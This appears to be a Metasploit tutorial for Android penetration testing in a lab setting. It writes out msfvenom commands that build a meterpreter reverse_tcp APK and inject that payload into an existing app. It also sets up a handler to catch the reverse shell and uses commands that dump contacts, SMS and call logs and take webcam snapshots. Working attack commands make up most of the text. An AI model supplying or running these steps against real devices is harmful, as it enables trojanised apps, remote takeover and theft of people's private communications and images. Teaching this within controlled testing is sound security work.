# Metasploit For Android

## DESCRIPTION

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing. It is owned by Boston, Massachusetts-based security company Rapid7.

Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine.

## PREREQUISITES

1. Metasploit

2. adb(Android debug bridge)

3. Genymotion/Android device

Exploitation to get an android reverse shell
Connect to the remote target device(genymotion/android) using adb

![1](Images/Documentations/Metasploit_for_Android/1.jpg)

1) Steps to generate an apk with the reverse_tcp payload
Go to ‘opt/metasploit-framework/bin’ and enter the following command to generate an apk

$ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>

!img
!img

Install the apk generated on the target device(genymotion/android)

!img
!img

Go to ‘opt/metasploit-framework/bin’ and follow the steps to get the reverse shell

$ ./msfconsole

!img

$ use exploit/multi/handler

!img


$ set payload android/meterpreter/reverse_tcp

!img

$ show options

!img

$ set LHOST <localhost ip>

!img

$ exploit ‘or’ run

!img

Click on the test.apk application in the remote target device(genymotion/android) to get the reverse shell

!img

$ help ‘or’ ?

!img

$ dump_contacts

!img

$ dump_sms

!img

$ dump_calllog

!img

Go to the ‘metasploit-framework’ folder to get the dumps

!img

$ cat <calllog.txt>

!img

$ cat <contacts.txt>

!img

$ cat <sms.txt>

!img

Commands for webcam

$ webcam_list

$ webcam_snap 1 ‘or’ 2

!img

!img

2) Steps to inject reverse_tcp payload in an existing app(diva-beta.apk)

Go to ‘opt/metasploit-framework/bin’ and enter the following command

$ ./msfvenom -x <apk path/apkname.apk> -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>

!img

Install the app in the device and repeat the msfconsole steps as shown earlier to get the reverse shell.

## Extra Commands for metasploit

$ show exploits- (Get all exploits till date)

$ search <any random keyword>

(ex- search android- to get all exploits related to android)

$ info <exploit>

Thanks for reading!





